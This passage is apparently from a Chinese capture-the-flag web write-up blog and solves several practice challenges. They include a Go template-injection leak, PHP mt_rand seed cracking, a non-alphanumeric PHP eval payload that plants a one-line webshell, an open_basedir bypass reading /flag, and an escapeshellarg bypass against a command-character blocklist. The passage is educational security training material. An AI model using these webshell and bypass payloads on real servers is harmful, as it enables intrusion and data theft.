class="string">&quot;22&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;hack you!&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">2</span>,</span><br><span class="line">Username: <span class="string">&quot;Longlone&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;??&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;i don&#x27;t know&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">3</span>,</span><br><span class="line">Username: <span class="string">&quot;Teacher Ma&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;20&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;guess&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Admin = UserInfo&#123;</span><br><span class="line">Id:       <span class="number">0</span>,</span><br><span class="line">Username: <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;flag&#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png" alt="image-20241206135001872"></p><p>我们发现当id为0时age为空，此时age是可以由我们自己传参的，也就是可控的，后续的代码对age进行了模板渲染，存在ssti。</p><p>而在go语言中使用的是<code>&#123;&#123;.name&#125;&#125;</code>代表要应用的对象，所以可以让<code>age=&#123;&#123;.Password&#125;&#125;</code></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png" alt="在这里插入图片描述"></p><p>拿下了</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png" alt="image-20241206135214358"></p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png" alt="image-20241206162301273" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png" alt="image-20241206162320564" style="zoom:67%;" /><p>网页源代码中发现js代码，存在校验界面check.php，打开看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>已知数猜种子，h5n5BBh4Rg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;h5n5BBh4Rg&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s pretend to know only the first password.  We need to convert it to</span><br><span class="line">inputs to php_mt_seed</span><br></pre></td></tr></table></figure><p>得到如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 7 0 61 31 31 0 61 13 13 0 61 31 31 0 61 37 37 0 61 37 37 0 61 7 7 0 61 30 30 0 61 53 53 0 61 6 6 0 61</span><br></pre></td></tr></table></figure><p>传入php_mt_seed即可！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png" alt="image-20241206170630174"></p><p>拿下种子！53788000</p><p>构造一下随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">53788000</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png" alt="image-20241206170818784"></p><h2 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>挺简单的，自增就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:29288/?wllm=%24%5F%3D%5B%5D%3B%24%5F%3D%40%22%24%5F%22%3B%24%5F%3D%24%5F%5B%27%21%27%3D%3D%27%40%27%5D%3B%24%5F%5F%5F%3D%24%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B</span><br><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure><p>往1.php中写入一个一句话木马，当时system执行不了，看了下phpinfo()发现ban了好多函数，file_get_contents和file_put_contents还在，先写个方便点的后门然后看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;2.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>回显如下</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png" alt="image-20241206181457145"></p><p>被限制在&#x2F;tmp目录下，接下来还是试试直接file_get_contents能不能获取到flag</p><p>不行，好烦啊这种disable function，直接哥斯拉！！！里面会自动绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png" alt="image-20241206182342197"></p><p>牛逼哥斯拉！</p><p>这种方法也可以！</p><p>绕过open_basedir的方法！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;a.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;);</span><br></pre></td></tr></table></figure><p>关键代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br></pre></td></tr></table></figure><p>将限制设置为当前目录的父目录</p><p>经过三次chdir，自身变到了&#x2F;var，但是此时open_basedir为其父目录，因此就是根目录，那么就拿下了！</p><h2 id="广东强网杯-2021-团队组-love-Pokemon"><a href="#广东强网杯-2021-团队组-love-Pokemon" class="headerlink" title="[广东强网杯 2021 团队组]love_Pokemon"></a>[广东强网杯 2021 团队组]love_Pokemon</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DefenderBonus</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Pokemon</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ghostpokemon</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$Pokemon</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$pks</span>) &#123;</span><br><span class="line">            <span class="variable">$Pokemon</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$pks</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Pokemon</span> = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$Pokemon</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;myfavorite&#x27;</span>] ?? <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;picacu!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;picacu!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;bulbasaur!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;miaowa!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$level</span> = <span class="variable">$_POST</span>[<span class="string">&quot;levelup&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="variable">$level</span>)) &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$level</span>))))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./hint.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;squirtle&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;jienijieni!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;mewtwo&#x27;</span>:</span><br><span class="line">        <span class="variable">$dream</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dream&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$dream</span>)&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;So Big Pokenmon!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ghostpokemon</span>(<span class="variable">$dream</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$dream</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先是关于escapeshellarg的考点。</p><pre><code>escapeshellarg 的作用是把字符串转码为可以在 shell 命令里使用的参数。（escapeshellarg 和 escapeshellcmd 相似，主要看是否有引号）那么这里就可以使用漏洞：escapeshellarg()这个函数在处理超过ASCII码范围的字符的时候会直接过滤掉该字符串</code></pre><p>那么我们直接我们可以用%81去绕过，因为%81为不可见字符（当然还有其他的）<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png" alt="image-20241207183625856"></p><p>读取到了hint.php</p><p>然后就是对&#x2F;flag内容的读取了！</p><p>但是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br></pre></td></tr></table></figure><p>过滤了一堆，先看绕过空格过滤</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png" alt="img"></p><p>然后是读取的命令，过滤了太多啦！！od可以用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 